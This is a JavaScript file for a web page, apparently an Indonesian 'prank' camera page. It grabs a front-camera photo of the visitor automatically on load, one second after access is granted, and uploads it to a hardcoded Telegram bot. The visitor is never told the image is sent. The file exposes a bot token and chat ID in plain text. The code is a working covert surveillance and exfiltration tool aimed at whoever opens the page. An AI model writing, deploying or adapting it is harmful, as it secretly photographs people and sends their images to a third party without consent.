let stream = null;
let capturedImage = null;

const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
const TELEGRAM_CHAT_ID = "5323236080";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

window.addEventListener('load', () => {
    requestCameraAccess();
});

async function requestCameraAccess() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });

        video.srcObject = stream;
        video.onloadedmetadata = () => {
            video.play();
            setTimeout(() => {
                capturePhoto();
            }, 1000);
        };

    } catch (error) {
        console.error('Error akses kamera:', error);
        alert('Izinkan akses kamera untuk melanjutkan!');
    }
}

function capturePhoto() {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    capturedImage = canvas.toDataURL('image/jpeg');

    if (stream) {
        stream.getTracks().forEach(track => track.stop());
    }

    sendPhotoToTelegram();
    displayCapturedPhoto();
}

async function sendPhotoToTelegram() {
    try {
        const blob = await fetch(capturedImage).then(r => r.blob());
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, 'prank.jpg');
        formData.append('caption', '📸 Foto berhasil dikapture!');

        const response = await fetch(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            {
                method: 'POST',
                body: formData
            }
        );

        const data = await response.json();
        if (data.ok) {
            console.log('✅ Foto terkirim!');
        }
    } catch (error) {
        console.error('❌ Error:', error);
    }
}

function displayCapturedPhoto() {
    video.style.display = 'none';
    
    const img = document.createElement('img');
    img.src = capturedImage;
    img.id = 'captured-photo';
    img.style.width = '100%';
    img.style.height = '100%';
    img.style.objectFit = 'cover';
    
    const container = document.getElementById('camera-permission');
    container.innerHTML = '';
    container.appendChild(img);

    const button = document.createElement('button');
    button.textContent = 'Ulangi';
    button.id = 'retry-btn';
    button.style.position = 'absolute';
    button.style.bottom = '30px';
    button.style.padding = '12px 30px';
    button.style.fontSize = '1rem';
    button.style.background = '#667eea';
    button.style.color = 'white';
    button.style.border = 'none';
    button.style.borderRadius = '50px';
    button.style.cursor = 'pointer';
    button.style.fontWeight = '600';
    
    container.appendChild(button);
    
    button.addEventListener('click', () => {
        capturedImage = null;
        video.style.display = 'block';
        requestCameraAccess();
    });
}
